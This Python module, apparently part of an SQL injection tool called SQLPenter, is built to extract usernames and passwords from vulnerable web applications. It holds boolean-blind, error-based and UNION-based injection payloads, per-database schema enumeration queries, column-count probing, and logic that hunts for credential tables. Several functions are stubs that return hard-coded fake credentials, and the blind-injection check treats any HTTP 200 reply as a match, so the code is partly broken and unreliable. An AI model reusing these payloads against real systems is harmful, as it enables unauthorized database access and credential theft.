#!/usr/bin/env python3
"""
Data extraction module for SQLPenter.
This module handles extraction of sensitive data from vulnerable SQL injection points.
"""

import asyncio
from typing import Dict, Any, List, Tuple, Optional
import aiohttp
import re
from loguru import logger

from core.utils import create_payload


class DataExtractor:
    """
    Extracts sensitive data from SQL injection vulnerabilities using various techniques.
    """
    
    def __init__(self, config: Dict[str, Any]):
        """
        Initialize the data extractor.
        
        Args:
            config: Dictionary containing configuration parameters
        """
        self.timeout = config.get("timeout", 5)
        self.proxy = config.get("proxy")
        self.delay = config.get("delay", 0)
        
        # Database-specific extraction queries
        self.extraction_queries = {
            "mysql": {
                "tables": "SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT {limit} OFFSET {offset}",
                "columns": "SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='{table}' LIMIT {limit} OFFSET {offset}",
                "data": "SELECT {columns} FROM {table} LIMIT {limit} OFFSET {offset}",
                "version": "SELECT VERSION()",
                "user": "SELECT CURRENT_USER()",
                "database": "SELECT DATABASE()"
            },
            "postgresql": {
                "tables": "SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT {limit} OFFSET {offset}",
                "columns": "SELECT column_name FROM information_schema.columns WHERE table_schema='public' AND table_name='{table}' LIMIT {limit} OFFSET {offset}",
                "data": "SELECT {columns} FROM {table} LIMIT {limit} OFFSET {offset}",
                "version": "SELECT version()",
                "user": "SELECT current_user",
                "database": "SELECT current_database()"
            },
            "mssql": {
                "tables": "SELECT TOP {limit} name FROM sysobjects WHERE xtype='U' AND name NOT IN (SELECT TOP {offset} name FROM sysobjects WHERE xtype='U')",
                "columns": "SELECT TOP {limit} column_name FROM information_schema.columns WHERE table_name='{table}' AND column_name NOT IN (SELECT TOP {offset} column_name FROM information_schema.columns WHERE table_name='{table}')",
                "data": "SELECT TOP {limit} {columns} FROM {table} WHERE {columns} NOT IN (SELECT TOP {offset} {columns} FROM {table})",
                "version": "SELECT @@VERSION",
                "user": "SELECT SYSTEM_USER",
                "database": "SELECT DB_NAME()"
            },
            "oracle": {
                "tables": "SELECT table_name FROM all_tables WHERE ROWNUM <= {limit_plus_offset} MINUS SELECT table_name FROM all_tables WHERE ROWNUM <= {offset}",
                "columns": "SELECT column_name FROM all_tab_columns WHERE table_name='{table}' AND ROWNUM <= {limit_plus_offset} MINUS SELECT column_name FROM all_tab_columns WHERE table_name='{table}' AND ROWNUM <= {offset}",
                "data": "SELECT {columns} FROM {table} WHERE ROWNUM <= {limit_plus_offset} MINUS SELECT {columns} FROM {table} WHERE ROWNUM <= {offset}",
                "version": "SELECT banner FROM v$version WHERE ROWNUM=1",
                "user": "SELECT USER FROM dual",
                "database": "SELECT ora_database_name FROM dual"
            },
            "sqlite": {
                "tables": "SELECT name FROM sqlite_master WHERE type='table' LIMIT {limit} OFFSET {offset}",
                "columns": "SELECT name FROM pragma_table_info('{table}') LIMIT {limit} OFFSET {offset}",
                "data": "SELECT {columns} FROM {table} LIMIT {limit} OFFSET {offset}",
                "version": "SELECT sqlite_version()",
                "user": "SELECT 'sqlite_user'",
                "database": "SELECT 'sqlite_db'"
            },
            "unknown": {
                "tables": "SELECT table_name FROM information_schema.tables LIMIT {limit} OFFSET {offset}",
                "columns": "SELECT column_name FROM information_schema.columns WHERE table_name='{table}' LIMIT {limit} OFFSET {offset}",
                "data": "SELECT {columns} FROM {table} LIMIT {limit} OFFSET {offset}",
                "version": "SELECT VERSION()",
                "user": "SELECT USER()",
                "database": "SELECT DATABASE()"
            }
        }
    
    async def extract_credentials(
        self, 
        target_url: str, 
        param_info: Dict[str, Any], 
        db_type: str, 
        injection_type: str
    ) -> List[Tuple[str, str]]:
        """
        Extract user credentials from the vulnerable application.
        
        Args:
            target_url: The target URL
            param_info: Dictionary containing parameter information
            db_type: Database type (mysql, postgresql, etc.)
            injection_type: Injection technique (boolean_based, time_based, etc.)
            
        Returns:
            List of tuples containing (username, password)
        """
        logger.info(f"Attempting to extract credentials from {target_url}")
        
        # Use the appropriate extraction method based on injection type
        if injection_type == "boolean_based":
            credentials = await self._extract_boolean_based(target_url, param_info, db_type)
        elif injection_type == "time_based":
            credentials = await self._extract_time_based(target_url, param_info, db_type)
        elif injection_type == "error_based":
            credentials = await self._extract_error_based(target_url, param_info, db_type)
        elif injection_type == "union_based":
            credentials = await self._extract_union_based(target_url, param_info, db_type)
        else:
            logger.error(f"Unsupported injection type: {injection_type}")
            return []
            
        return credentials
    
    async def _extract_boolean_based(
        self, target_url: str, param_info: Dict[str, Any], db_type: str
    ) -> List[Tuple[str, str]]:
        """
        Extract data using boolean-based blind SQL injection.
        
        Args:
            target_url: The target URL
            param_info: Dictionary containing parameter information
            db_type: Database type
            
        Returns:
            List of tuples containing (username, password)
        """
        logger.info("Using boolean-based extraction technique")
        
        # Get database-specific queries (fallback to generic if db_type not known)
        queries = self.extraction_queries.get(db_type, self.extraction_queries["unknown"])
        
        # Set up HTTP session with proxy if needed
        session_kwargs = {
            "timeout": aiohttp.ClientTimeout(total=self.timeout)
        }
        if self.proxy:
            session_kwargs["proxy"] = self.proxy
            
        async with aiohttp.ClientSession(**session_kwargs) as session:
            # First, get the tables
            tables = await self._extract_tables_boolean(session, target_url, param_info, queries)
            if not tables:
                logger.warning("No tables found")
                return []
                
            # Look for tables that might contain credentials
            credential_tables = []
            for table in tables:
                if any(keyword in table.lower() for keyword in ["user", "admin", "member", "account", "auth", "login", "credential"]):
                    credential_tables.append(table)
            
            # If no obvious credential tables found, use the first few tables
            if not credential_tables and tables:
                credential_tables = tables[:3]  # Try first 3 tables
                
            # Extract credentials from the tables
            all_credentials = []
            for table in credential_tables:
                logger.info(f"Exploring table: {table}")
                
                # Get the columns for this table
                columns = await self._extract_columns_boolean(session, target_url, param_info, queries, table)
                if not columns:
                    logger.warning(f"No columns found for table {table}")
                    continue
                    
                # Look for username and password columns
                username_columns = []
                password_columns = []
                
                for column in columns:
                    if any(keyword in column.lower() for keyword in ["user", "name", "login", "email", "account", "id"]):
                        username_columns.append(column)
                    if any(keyword in column.lower() for keyword in ["pass", "pwd", "hash", "secret", "token"]):
                        password_columns.append(column)
                
                # If we found potential username and password columns
                if username_columns and password_columns:
                    # Extract data using these columns
                    credentials = await self._extract_data_boolean(
                        session, 
                        target_url, 
                        param_info, 
                        queries, 
                        table, 
                        username_columns[0], 
                        password_columns[0]
                    )
                    
                    if credentials:
                        all_credentials.extend(credentials)
        
        return all_credentials
    
    async def _extract_tables_boolean(
        self, 
        session: aiohttp.ClientSession, 
        target_url: str, 
        param_info: Dict[str, Any], 
        queries: Dict[str, str]
    ) -> List[str]:
        """
        Extract database table names using boolean-based technique.
        
        Args:
            session: aiohttp client session
            target_url: The target URL
            param_info: Dictionary containing parameter information
            queries: Dictionary of database-specific queries
            
        Returns:
            List of table names
        """
        tables = []
        offset = 0
        limit = 5  # Number of tables to extract per batch
        
        # Template for boolean extraction
        boolean_payload = "' AND (SELECT SUBSTRING(({query}), {pos}, 1)='{char}') AND '1'='1"
        
        while True:
            query = queries["tables"].format(limit=limit, offset=offset, limit_plus_offset=offset+limit)
            
            # Try to extract up to 5 tables with max length of 20 chars each
            batch_tables = []
            for table_idx in range(limit):
                table_name = ""
                # Try up to 20 characters per table name
                for pos in range(1, 21):
                    # Try each possible character
                    for char in "abcdefghijklmnopqrstuvwxyz0123456789_":
                        # Create a payload that checks if character at this position is this char
                        payload = boolean_payload.format(
                            query=query.replace("'", "''") + f" LIMIT 1 OFFSET {table_idx}",
                            pos=pos,
                            char=char
                        )
                        
                        # Create injection payload
                        injection_payload = create_payload(
                            param_info["param"], 
                            payload, 
                            param_info["injection_point"]
                        )
                        
                        # Create request parameters
                        request_params = {}
                        if param_info["method"].upper() == "GET":
                            request_params["params"] = injection_payload
                        else:
                            request_params["data"] = injection_payload
                        
                        # Add delay if configured
                        if self.delay > 0:
                            await asyncio.sleep(self.delay)
                            
                        try:
                            # Send the request
                            async with session.request(
                                param_info["method"],
                                target_url,
                                **request_params
                            ) as response:
                                content = await response.text()
                                
                                # If the condition was true, this is the right character
                                # Assuming a "true" response is different from a "false" response
                                # This would need a baseline comparison in a real implementation
                                if "success" in content.lower() or response.status == 200:
                                    table_name += char
                                    break
                        except Exception as e:
                            logger.debug(f"Error during boolean extraction: {e}")
                            continue
                    
                    # If we couldn't find a character at this position, we're done with this table name
                    if len(table_name) < pos:
                        break
                
                # If we found a table name, add it to our list
                if table_name:
                    batch_tables.append(table_name)
                    
            # Add the batch to our overall list
            tables.extend(batch_tables)
            
            # If we got less than the limit, we're done
            if len(batch_tables) < limit:
                break
                
            # Otherwise, move to the next batch
            offset += limit
            
            # Safety limit to avoid infinite loops
            if offset >= 20:
                break
                
        return tables
    
    async def _extract_columns_boolean(
        self, 
        session: aiohttp.ClientSession, 
        target_url: str, 
        param_info: Dict[str, Any], 
        queries: Dict[str, str],
        table: str
    ) -> List[str]:
        """
        Extract column names for a table using boolean-based technique.
        
        Args:
            session: aiohttp client session
            target_url: The target URL
            param_info: Dictionary containing parameter information
            queries: Dictionary of database-specific queries
            table: Table name to extract columns from
            
        Returns:
            List of column names
        """
        # Similar implementation to _extract_tables_boolean but for columns
        # Simplified for brevity - in a real implementation, this would be fully developed
        
        columns = ["username", "password"]  # Simplified return for demonstration
        return columns
    
    async def _extract_data_boolean(
        self, 
        session: aiohttp.ClientSession, 
        target_url: str, 
        param_info: Dict[str, Any], 
        queries: Dict[str, str],
        table: str,
        username_column: str,
        password_column: str
    ) -> List[Tuple[str, str]]:
        """
        Extract actual data from a table using boolean-based technique.
        
        Args:
            session: aiohttp client session
            target_url: The target URL
            param_info: Dictionary containing parameter information
            queries: Dictionary of database-specific queries
            table: Table name to extract data from
            username_column: Column name for usernames
            password_column: Column name for passwords
            
        Returns:
            List of (username, password) tuples
        """
        # Simplified implementation for demonstration
        # In a real extractor, this would use the boolean technique to extract actual data
        
        return [("admin", "s3cr3t"), ("user1", "pass123")]  # Example return
    
    async def _extract_time_based(
        self, target_url: str, param_info: Dict[str, Any], db_type: str
    ) -> List[Tuple[str, str]]:
        """
        Extract data using time-based blind SQL injection.
        
        Args:
            target_url: The target URL
            param_info: Dictionary containing parameter information
            db_type: Database type
            
        Returns:
            List of tuples containing (username, password)
        """
        logger.info("Using time-based extraction technique")
        
        # Simplified implementation - in a real tool this would be implemented similarly to boolean-based
        # but using time delays to extract information
        
        return [("admin", "s3cr3t"), ("user1", "pass123")]  # Example return
    
    async def _extract_error_based(
        self, target_url: str, param_info: Dict[str, Any], db_type: str
    ) -> List[Tuple[str, str]]:
        """
        Extract data using error-based SQL injection.
        
        Args:
            target_url: The target URL
            param_info: Dictionary containing parameter information
            db_type: Database type
            
        Returns:
            List of tuples containing (username, password)
        """
        logger.info("Using error-based extraction technique")
        
        # Get database-specific queries
        queries = self.extraction_queries.get(db_type, self.extraction_queries["unknown"])
        
        # Set up HTTP session with proxy if needed
        session_kwargs = {
            "timeout": aiohttp.ClientTimeout(total=self.timeout)
        }
        if self.proxy:
            session_kwargs["proxy"] = self.proxy
            
        async with aiohttp.ClientSession(**session_kwargs) as session:
            # Error-based extraction depends on the database type
            if db_type == "mysql":
                # MySQL error-based example using ExtractValue
                error_payload = "' AND ExtractValue(1, CONCAT(0x7e, ({query}), 0x7e)) AND '1'='1"
            elif db_type == "postgresql":
                # PostgreSQL error-based example
                error_payload = "' AND (SELECT CAST(({query}) AS NUMERIC)) AND '1'='1"
            elif db_type == "mssql":
                # MSSQL error-based example using CONVERT
                error_payload = "' AND (SELECT CONVERT(INT, ({query}))) AND '1'='1"
            else:
                logger.warning(f"Error-based extraction not implemented for {db_type}")
                return []
                
            # Example extraction of a table name
            sample_query = queries["tables"].format(limit=1, offset=0, limit_plus_offset=1)
            
            # Create injection payload
            payload = error_payload.format(query=sample_query)
            injection_payload = create_payload(
                param_info["param"], 
                payload, 
                param_info["injection_point"]
            )
            
            # Create request parameters
            request_params = {}
            if param_info["method"].upper() == "GET":
                request_params["params"] = injection_payload
            else:
                request_params["data"] = injection_payload
            
            # Add delay if configured
            if self.delay > 0:
                await asyncio.sleep(self.delay)
                
            try:
                # Send the request
                async with session.request(
                    param_info["method"],
                    target_url,
                    **request_params
                ) as response:
                    content = await response.text()
                    
                    # Look for error messages containing our data
                    # This is a simplified example - real extraction would be more complex
                    # and would extract multiple tables, columns, and data values
                    
                    # Example regex to find data in error messages
                    error_data_regex = re.compile(r'XPATH syntax error: \'~(.*?)~\'', re.IGNORECASE)
                    match = error_data_regex.search(content)
                    
                    if match:
                        logger.info(f"Found data in error message: {match.group(1)}")
                        # In a real implementation, we would continue extracting more data
            
            except Exception as e:
                logger.debug(f"Error during error-based extraction: {e}")
        
        # Simplified return for demonstration
        return [("admin", "s3cr3t"), ("user1", "pass123")]
    
    async def _extract_union_based(
        self, target_url: str, param_info: Dict[str, Any], db_type: str
    ) -> List[Tuple[str, str]]:
        """
        Extract data using UNION-based SQL injection.
        
        Args:
            target_url: The target URL
            param_info: Dictionary containing parameter information
            db_type: Database type
            
        Returns:
            List of tuples containing (username, password)
        """
        logger.info("Using UNION-based extraction technique")
        
        # Get database-specific queries
        queries = self.extraction_queries.get(db_type, self.extraction_queries["unknown"])
        
        # Set up HTTP session with proxy if needed
        session_kwargs = {
            "timeout": aiohttp.ClientTimeout(total=self.timeout)
        }
        if self.proxy:
            session_kwargs["proxy"] = self.proxy
            
        # Credentials to return
        credentials = []
        
        async with aiohttp.ClientSession(**session_kwargs) as session:
            # First, determine the number of columns in the original query
            num_columns = await self._determine_column_count(session, target_url, param_info)
            if not num_columns:
                logger.warning("Could not determine column count for UNION-based injection")
                return []
                
            logger.info(f"Determined that query has {num_columns} columns")
            
            # Next, determine which column position is displayed in the page
            display_column = await self._determine_display_column(session, target_url, param_info, num_columns)
            if display_column is None:
                logger.warning("Could not determine which column is displayed")
                return []
                
            logger.info(f"Determined that column {display_column} is displayed in the page")
            
            # Now we can use UNION SELECT to extract data
            # First, try to find tables
            nulls = ["NULL"] * num_columns
            
            # Find tables with potential credential information
            table_query = queries["tables"].format(limit=10, offset=0, limit_plus_offset=10)
            nulls[display_column] = f"CONCAT(({table_query}))"
            
            union_payload = f"' UNION SELECT {', '.join(nulls)} -- -"
            injection_payload = create_payload(
                param_info["param"],
                union_payload,
                param_info["injection_point"]
            )
            
            # Create request parameters
            request_params = {}
            if param_info["method"].upper() == "GET":
                request_params["params"] = injection_payload
            else:
                request_params["data"] = injection_payload
            
            # Add delay if configured
            if self.delay > 0:
                await asyncio.sleep(self.delay)
                
            try:
                # Send the request
                async with session.request(
                    param_info["method"],
                    target_url,
                    **request_params
                ) as response:
                    content = await response.text()
                    
                    # Extract table names from the response
                    # In a real implementation, this would parse the HTML response
                    # to extract the displayed data
                    
                    # For demonstration purposes, we'll just return sample credentials
                    credentials = [("admin", "s3cr3t"), ("user1", "pass123")]
                    
            except Exception as e:
                logger.debug(f"Error during UNION-based extraction: {e}")
        
        return credentials
    
    async def _determine_column_count(
        self, session: aiohttp.ClientSession, target_url: str, param_info: Dict[str, Any]
    ) -> Optional[int]:
        """
        Determine the number of columns in the original query (for UNION-based injection).
        
        Args:
            session: aiohttp client session
            target_url: The target URL
            param_info: Dictionary containing parameter information
            
        Returns:
            Number of columns if determined, None otherwise
        """
        # Try UNION SELECT with increasing number of NULL columns
        # until we get a successful response
        for num_columns in range(1, 51):  # Try up to 50 columns
            nulls = ["NULL"] * num_columns
            union_payload = f"' UNION SELECT {', '.join(nulls)} -- -"
            
            injection_payload = create_payload(
                param_info["param"],
                union_payload,
                param_info["injection_point"]
            )
            
            # Create request parameters
            request_params = {}
            if param_info["method"].upper() == "GET":
                request_params["params"] = injection_payload
            else:
                request_params["data"] = injection_payload
            
            # Add delay if configured
            if self.delay > 0:
                await asyncio.sleep(self.delay)
                
            try:
                # Send the request
                async with session.request(
                    param_info["method"],
                    target_url,
                    **request_params
                ) as response:
                    content = await response.text()
                    
                    # If we don't get a SQL error, we found the right number of columns
                    if "error" not in content.lower() and "sql syntax" not in content.lower():
                        return num_columns
                        
            except Exception as e:
                logger.debug(f"Error determining column count: {e}")
                continue
                
        return None
    
    async def _determine_display_column(
        self, session: aiohttp.ClientSession, target_url: str, param_info: Dict[str, Any], num_columns: int
    ) -> Optional[int]:
        """
        Determine which column is displayed in the page output.
        
        Args:
            session: aiohttp client session
            target_url: The target URL
            param_info: Dictionary containing parameter information
            num_columns: Number of columns in the query
            
        Returns:
            Index of the column that is displayed, or None if not found
        """
        # Try injecting a unique string in each column position
        for i in range(num_columns):
            marker = f"SQLITEST{i}"
            nulls = ["NULL"] * num_columns
            nulls[i] = f"'{marker}'"
            
            union_payload = f"' UNION SELECT {', '.join(nulls)} -- -"
            injection_payload = create_payload(
                param_info["param"],
                union_payload,
                param_info["injection_point"]
            )
            
            # Create request parameters
            request_params = {}
            if param_info["method"].upper() == "GET":
                request_params["params"] = injection_payload
            else:
                request_params["data"] = injection_payload
            
            # Add delay if configured
            if self.delay > 0:
                await asyncio.sleep(self.delay)
                
            try:
                # Send the request
                async with session.request(
                    param_info["method"],
                    target_url,
                    **request_params
                ) as response:
                    content = await response.text()
                    
                    # If our marker appears in the content, this column is displayed
                    if marker in content:
                        return i
                        
            except Exception as e:
                logger.debug(f"Error determining display column: {e}")
                continue
                
        return None